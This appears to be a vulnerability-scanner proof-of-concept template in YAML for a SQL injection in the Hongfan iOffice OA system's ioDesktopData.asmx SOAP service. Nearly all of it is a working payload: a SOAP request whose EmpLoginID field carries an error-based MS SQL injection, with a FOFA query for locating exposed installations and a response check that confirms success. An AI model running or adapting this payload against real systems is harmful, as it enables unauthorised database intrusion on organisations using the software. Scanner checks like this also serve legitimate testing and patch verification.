id: poc-yaml-hongfan-oa-iodesktopdata-sqli
info:
  name: 红帆OA ioDesktopData SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: iOffice
  fofa: app="红帆-ioffice"
variables:
  t1: random_int(1000,9999)
  t2: md5(t1)
requests:
- method: POST
  path: /iOffice/prg/set/wss/ioDesktopData.asmx
  headers:
    Content-Type: text/xml;charset=UTF-8
  data: '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">

    <soap:Header/>

    <soap:Body>

    <tem:GetDepSchedule>

    <!--type: string-->

    <tem:EmpLoginID>''+(SELECT CHAR(68)+CHAR(79)+CHAR(99)+CHAR(105) WHERE 5220=5220
    AND 5581 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT
    SUBSTRING((ISNULL(CAST(sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''{{.t1}}''))
    AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(98)+CHAR(113))))+''</tem:EmpLoginID>

    </tem:GetDepSchedule>

    </soap:Body>

    </soap:Envelope>'
  expression: 'status_code == 500 &&

    contains(body,"nvarchar") &&

    contains(body,t2)

    '
transport: http
